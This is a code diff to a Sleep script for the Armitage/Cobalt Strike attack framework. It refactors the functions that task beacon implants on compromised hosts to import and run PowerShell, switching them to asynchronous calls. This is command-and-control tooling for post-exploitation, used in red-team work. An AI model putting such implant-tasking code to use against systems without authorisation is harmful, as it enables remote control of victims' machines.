@@ -1,3 +1,15 @@
+import msf.*;
+import java.awt.*;
+import java.io.*;
+import java.net.*;
+import javax.swing.*;
+import javax.imageio.*;
+import ui.*;
+import console.*;
+import armitage.*;
+
+import cloudstrike.*;
+
 on heartbeat_10s {
     local('@beacons $beacon $bid %data @new @all');
 
@@ -19,8 +31,8 @@ sub task_powershell_import {
     $len = strlen($data);
 
     # task beacon to import the PowerShell script
-    call("beacon.task", $id, pack("IIZ $+ $len", 0x25, $len, $data), lhost());
-    call("beacon.log_write", $id, "[*] Tasked beacon to import PowerShell\n");
+    call_async($mclient, "beacon.task", $id, pack("IIZ $+ $len", 0x25, $len, $data), lhost());
+    call_async($mclient, "beacon.log_write", $id, "[*] Tasked beacon to import PowerShell\n");
 }
 
 sub task_powershell {
@@ -28,8 +40,8 @@ sub task_powershell {
     $id = $1;
     $len  = strlen($2);
 
-    call("beacon.task", $id, pack("IIZ $+ $len", 0x24, $len, $2), lhost());
-    call("beacon.log_write", $id, "[*] Tasked beacon to run: $2 $+ \n");
+    call_async($mclient, "beacon.task", $id, pack("IIZ $+ $len", 0x24, $len, $2), lhost());
+    call_async($mclient, "beacon.log_write", $id, "[*] Tasked beacon to run: $2 $+ \n");
 }
 
 popup beacon_top {
